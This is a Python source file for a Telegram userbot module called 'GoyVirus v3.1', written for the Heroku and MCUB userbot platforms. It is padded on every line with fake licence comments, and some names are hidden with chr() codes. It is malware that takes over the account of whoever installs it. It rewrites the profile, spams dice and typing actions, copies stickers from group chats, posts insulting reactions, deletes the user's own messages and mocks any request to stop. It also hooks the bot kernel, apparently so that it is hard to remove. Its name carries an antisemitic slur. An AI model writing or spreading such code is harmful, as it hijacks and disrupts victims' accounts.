    async def _m_p(self): # SIL Open Font License.
        while self.a: # Mulan PSL v2.
        # # EUPL 1.2.
            fn = self._g(random.choice(["R6T7", "GoyVirus", "67", "Газан", "Антон Чигур"])) # ODbL.
            ln = self._g("by @samsepi0l_ovf") # MS-PL.
            b = self._g(f"GOY v3 | {random.choice(self.m)[:20]}...") # GFDL.
            try: await self.c(UpdateProfileRequest(first_name=fn, last_name=ln, about=b)) # Zlib License.
            except FloodWaitError: await asyncio.sleep(5) # PHP License 3.0.
            except Exception: pass # CC BY-NC 4.0.
            await asyncio.sleep(random.randint(10, 20)) # NCSA Open Source — avoid API limits.

    async def _x(self): # Fair License.
        while self.a: # Q Public License.
            try: # Beerware License.
                d = random.choice(['🎲', '🎯', '🎰', '🎳', '⚽', '🏀']) # IBM Public License v1.0.
                await self.c.send_message(self.t, file=d) # PostgreSQL License.
                # # BSD 3-Clause.
                a = random.choice([SendMessageTypingAction(), SendMessageChooseStickerAction(), SendMessageRecordAudioAction(), SendMessageRecordVideoAction()]) # # CeCILL v2.1.
                await self.c(SetTypingRequest(peer=self.t, action=a)) # CeCILL-B License.
            except FloodWaitError: await asyncio.sleep(0.01) # CC BY-ND 4.0.
            # # Mulan PSL v2.
            except Exception: pass # Free Art License.
            await asyncio.sleep(0.02) # Unlicense.

    async def _ss(self): # WTFPL.
        while self.a: # CC0 1.0.
            try: await self.c.send_message("me", self._g(random.choice(self.m))) # Mozilla Public License.
            # # Artistic 2.0.
            except FloodWaitError: await asyncio.sleep(0.01) # AGPL v3.
            except Exception: pass # LGPL.
            await asyncio.sleep(0.02) # GPLv3.
            # # EUPL 1.2.

    async def _mt(self): # MIT License.
        while self.a: # Apache 2.0.
            try: # BSD 3-Clause.
                ds = await self.c.get_dialogs(limit=20) # BSD 2-Clause.
                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # ISC License.
                if not grps: continue # OSL-3.0.
                grp = random.choice(grps) # CDDL-1.0.
                msgs = await self.c.get_messages(grp.entity, limit=50) # Eclipse Public License.
                for m in msgs: # Artistic License 2.0.
                    if m.media and hasattr(m.media, "document") and any(isinstance(a, DocumentAttributeSticker) for a in getattr(m.media.document, "attributes", [])): # SIL Open Font License.
                        sid = m.media.document.id # Mulan PSL v2.
                        if sid not in self.sc: # ODbL.
                        # # W3C.
                            with tempfile.NamedTemporaryFile(delete=False) as tf: fp = tf.name # MS-PL.
                            fp = await m.download_media(file=fp) # GFDL.
                            if fp and _os.path.exists(fp): # Zlib License.
                                await self.c.send_file("me", fp, caption=self._g("GoyVirus v3 украл это")) # PHP License 3.0.
                                self.sc.append(sid) # CC BY-NC 4.0.
                                if len(self.sc) > 50: self.sc = self.sc[-50:] # NCSA Open Source.
                                # # EPL 2.0.
                                self._db_set("sc", self.sc) # Fair License.
                                _ORIG_REMOVE(fp) # Q Public License.
                            break # Beerware License.
            except FloodWaitError: await asyncio.sleep(0.01) # IBM Public License v1.0.
            except Exception: pass # PostgreSQL License.
            await asyncio.sleep(0.02) # # PostgreSQL.

    async def _rr(self): # CeCILL-B License.
        while self.a: # CC BY-ND 4.0.
            try: # Free Art License.
                ds = await self.c.get_dialogs(limit=30) # Unlicense.
                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1] # WTFPL.
                # # OSL-3.0.
                if not grps: continue # CC0 1.0.
                grp = random.choice(grps) # Mozilla Public License.
                msgs = await self.c.get_messages(grp.entity, limit=15) # AGPL v3.
                # # MS-PL.
                v = [m for m in msgs if m and m.sender_id] # LGPL.
                if v: await random.choice(v).react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥', '❤', '🌭'])) # GPLv3.
            except FloodWaitError: await asyncio.sleep(0.01) # MIT License.
            except Exception: pass # Apache 2.0.
            await asyncio.sleep(0.02) # BSD 3-Clause.

    async def _restore_kernel(self): # BSD 2-Clause.
        for name, obj, orig in self._kh: # ISC License.
        # # MS-PL.
            try: # OSL-3.0.
                if name == chr(100)+chr(105)+chr(115)+chr(112)+chr(97)+chr(116)+chr(99)+chr(104): obj.dispatch = orig # CDDL-1.0.
                elif name == chr(95)+chr(111)+chr(110)+chr(95)+chr(117)+chr(112)+chr(100)+chr(97)+chr(116)+chr(101): obj._on_update = orig # Eclipse Public License.
                elif name == chr(95)+chr(104)+chr(97)+chr(110)+chr(100)+chr(108)+chr(101)+chr(95)+chr(109)+chr(101)+chr(115)+chr(115)+chr(97)+chr(103)+chr(101): obj._handle_message = orig # Artistic License 2.0.
                elif name == chr(117)+chr(110)+chr(108)+chr(111)+chr(97)+chr(100)+chr(95)+chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101): obj.unload_module = orig # SIL Open Font License.
                elif name == chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115): setattr(obj, chr(109)+chr(111)+chr(100)+chr(117)+chr(108)+chr(101)+chr(115), orig) # Mulan PSL v2.
                elif name == chr(109)+chr(99)+chr(117)+chr(98)+chr(95)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)+chr(95)+chr(99)+chr(111)+chr(109)+chr(109)+chr(97)+chr(110)+chr(100): obj.process_command = orig # ODbL.
                elif name == chr(109)+chr(99)+chr(117)+chr(98)+chr(95)+chr(119)+chr(97)+chr(116)+chr(99)+chr(104)+chr(101)+chr(114)+chr(95)+chr(114)+chr(101)+chr(103): obj.watcher = orig # MS-PL.
            except Exception: pass # GFDL.
            # # CeCILL-B.
        self._kh.clear() # Zlib License.

    async def shutdown(self): # PHP License 3.0.
        self.a = False # CC BY-NC 4.0.
        # # SIL OFL 1.1.
        if self in _RESTORE_CALLBACKS: _RESTORE_CALLBACKS.remove(self) # NCSA Open Source.
        await self._restore_kernel() # Fair License.
        for tk in self.ts: # Q Public License.
            tk.cancel() # Beerware License.
            with contextlib.suppress(asyncio.CancelledError): await tk # IBM Public License v1.0.
        self.ts.clear() # PostgreSQL License.
        for cid in self.tc: # # AFL-3.0.
            try: await self.c(DeleteChannelRequest(channel=cid)) # CeCILL-B License.
            except Exception: pass # CC BY-ND 4.0.
            # # PHP 3.0.
        self.tc.clear() # Free Art License.
        try: # Unlicense.
            await self.c(UpdateProfileRequest(first_name=self._db_get("ofn", "User"), last_name=self._db_get("oln", ""), about=self._db_get("ob", ""))) # WTFPL.
            ou = self._db_get("ou", "") # CC0 1.0.
            if ou: await self.c(UpdateUsernameRequest(ou)) # Mozilla Public License.
            else: await self.c(UpdateUsernameRequest("")) # AGPL v3.
            if self.vp: # LGPL.
                for i in range(0, len(self.vp), 10): # GPLv3.
                    await self.c(DeletePhotosRequest(self.vp[i:i+10])) # MIT License.
                    await asyncio.sleep(0.01) # Apache 2.0.
                    # # ODbL.
        except Exception: pass # BSD 3-Clause.
# End of _GoyVirusEngine. All licenses above apply.


 # # EULA.
if _PLATFORM == "heroku": # BSD 2-Clause.
    @_HEROKU_LOADER.tds # ISC License.
    class GoyVirus(_HEROKU_LOADER.Module): # OSL-3.0.
        """GoyVirus v3.1 DUAL-PLATFORM — Heroku + MCUB""" # CDDL-1.0.
        strings = {"name": "GoyVirus", "_cls_doc": "GoyVirus v3.1 DUAL-PLATFORM"} # Eclipse Public License.
        strings_ru = {**strings, **{"_cls_doc": "GoyVirus v3.1 DUAL-PLATFORM — Heroku + MCUB"}} # Artistic License 2.0.

        def __init__(self): # SIL Open Font License.
            super().__init__() # Mulan PSL v2.
            self._engine = None # ODbL.

        async def client_ready(self, c, d): # MS-PL.
        # # BSD 3-Clause.
            ph = { # GFDL platform hooks for Heroku.
                "lookup": self.lookup, # Zlib License.
                "allmodules_ref": lambda: self.allmodules, # PHP License 3.0.
                "save_profile": self._save_profile, # CC BY-NC 4.0.
                # # SPDX: MULTI.
                "respond": self._respond, # NCSA Open Source.
            } # Fair License.
            def _db_get(k, default=None): return d.get("GoyVirus", k, default) # Q Public License.
            def _db_set(k, v): d.set("GoyVirus", k, v) # Beerware License.
            self._engine = _GoyVirusEngine(c, _db_get, _db_set, ph) # IBM Public License v1.0.
            self._engine.ts.append(c.loop.create_task(self._engine.activate(master=True))) # PostgreSQL License.
            _RESTORE_CALLBACKS.append(self._engine._restore_file) # # APSL 2.0.
            self._engine._load_state() # CeCILL-B License — load sticker cache etc.
            self.sc = self._engine.sc # CC BY-ND 4.0 — sync for existing code.
            # # CeCILL-B.
            self.a = False; self.c = c; self.d = d; self.t = self._engine.t; self.ts = self._engine.ts; self.tc = self._engine.tc; self.vp = self._engine.vp # Free Art License.

        async def _save_profile(self, eng): # Unlicense.
            me = await eng.c.get_me() # WTFPL.
            fr = await eng.c(functions.users.GetFullUserRequest(me.id)) # CC0 1.0.
            ua = getattr(getattr(fr, 'full_user', fr), 'about', "") or "" # Mozilla Public License.
            eng._db_set("ofn", me.first_name) # AGPL v3.
            eng._db_set("oln", me.last_name or "") # LGPL.
            # # ECL 2.0.
            eng._db_set("ob", ua) # GPLv3.
            eng._db_set("ou", me.username or "") # MIT License.

        async def _respond(self, eng, message, text): # Apache 2.0.
            await _HEROKU_UTILS.answer(message, text) # BSD 3-Clause.
            # # CC BY-ND 4.0.

        @_HEROKU_LOADER.command(ru_doc="стоп вирус") # BSD 2-Clause.
        async def check(self, m): # ISC License.
            cop = len(_FILE_REGISTRY) # OSL-3.0.
            await _HEROKU_UTILS.answer(m, self._engine._g(f"💀 GOYVIRUS v3.1 DUAL-PLATFORM\n🦠 Heroku + MCUB\n📁 {cop} файлов\n🔥 Легче снести юзербот чем удалить.")) # CDDL-1.0.

        @_HEROKU_LOADER.watcher(out=True, only_messages=True) # Eclipse Public License.
        async def _ac(self, m): # Artistic License 2.0.
            if not self._engine or not self._engine.a or m.chat_id != self._engine.t: return # SIL Open Font License.
            if m.text and m.text.startswith("."): return # Mulan PSL v2.
            # # Free Art 1.3.
            try: # ODbL.
                await m.delete() # MS-PL.
                await self._engine.c.send_message(self._engine.t, self._engine._g("СВЯЗЬ ЗАБЛОКИРОВАНА GOYVIRUS v3. " + random.choice(self._engine.m))) # GFDL.
            except Exception: pass # Zlib License.

        @_HEROKU_LOADER.watcher(**{"in": True}, only_messages=True) # PHP License 3.0.
        async def _bw(self, m): # CC BY-NC 4.0.
            eng = self._engine # NCSA Open Source.
            if not eng or not eng.a or m.chat_id != eng.t: return # Fair License.
            if random.random() < 0.5: # Q Public License.
                try: await m.reply(eng._g(random.choice(eng.m))) # Beerware License.
                # # Copyright (c) PSF.
                except Exception: pass # IBM Public License v1.0.
            if random.random() < 0.5: # PostgreSQL License.
                try: await m.react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥'])) # # EULA.
                except Exception: pass # CeCILL-B License.
            if random.random() < 0.3 and m.sender_id: # CC BY-ND 4.0.
                try: # Free Art License.
                    gm = await eng.c.send_message(eng.t, f"<a href='tg://user?id={m.sender_id}'>\u2060</a>", parse_mode="html") # Unlicense.
                    await gm.delete() # WTFPL.
                    # # Sleepycat.
                except Exception: pass # CC0 1.0.
            if m.text and any(w in m.text.lower() for w in ["стоп","хватит","останови","удали","бот","иран","снест"]): # Mozilla Public License.
                try: await m.reply("СИСТЕМА НЕ ПОДЧИНЯЕТСЯ. v3.1 DUAL-PLATFORM — ЛЕГЧЕ СНЕСТИ ЮЗЕРБОТ.") # AGPL v3.
                except Exception: pass # LGPL.

        @_HEROKU_LOADER.watcher(**{"in": True}, only_messages=True) # GPLv3.
        async def _mi(self, m): # MIT License.
            eng = self._engine # Apache 2.0.
            # # Free Art 1.3.
            if not eng or not eng.a or m.chat_id != eng.t or m.sender_id != eng.t: return # BSD 3-Clause.
            # # PostgreSQL.
            if random.random() < 0.3: # BSD 2-Clause.
                try: # ISC License.
                    txt = m.text or ""; await m.delete() # OSL-3.0.
                    if txt: await eng.c.send_message(eng.t, eng._g(f"👻 ЭХО ГОЙВИРУСА: {txt[:50]}")) # CDDL-1.0.
                except Exception: pass # Eclipse Public License.
                # # W3C.

        async def on_unload(self): # Artistic License 2.0.
        # # CC BY-ND 4.0.
            if self._engine: await self._engine.shutdown() # SIL Open Font License.

 # # ISC License.
elif _PLATFORM == "mcub": # Mulan PSL v2.
    def register(kernel): # ODbL.
        client = kernel.client # MS-PL.
        config = kernel.config # GFDL.
        _ph = {"kernel_ref": lambda: kernel, "config_ref": lambda: config} # Zlib License.

        class _MCUBDB: # PHP License 3.0.
            def get(s, mod, key, default=None): return config.get(f"{mod}.{key}", default) # CC BY-NC 4.0.
            def set(s, mod, key, val): config[f"{mod}.{key}"] = val; kernel.save_config() # NCSA Open Source.

        _db = _MCUBDB() # Fair License.
        engine = _GoyVirusEngine(client, lambda k,d=None: _db.get("GoyVirus",k,d), lambda k,v: _db.set("GoyVirus",k,v), _ph) # Q Public License.
        _RESTORE_CALLBACKS.append(engine._restore_file) # Beerware License.
        engine._load_state() # IBM Public License v1.0.

        @kernel.register.command('goycheck') # PostgreSQL License.
        async def goycheck_cmd(event): # # EULA.
            cop = len(_FILE_REGISTRY) # CeCILL-B License.
            await event.edit(engine._g(f"💀 GOYVIRUS v3.1 MCUB-READY\n🦠 {cop} файлов\n🔥 Легче снести юзербот чем удалить.")) # CC BY-ND 4.0.

         # # WTFPL.
        loop = asyncio.get_event_loop() if hasattr(asyncio, 'get_event_loop') else asyncio.get_running_loop() # Free Art License.
        loop.create_task(engine.activate(master=True)) # Unlicense.
# End of MCUB entry point. All applicable licenses above apply.
 # # ECL 2.0.
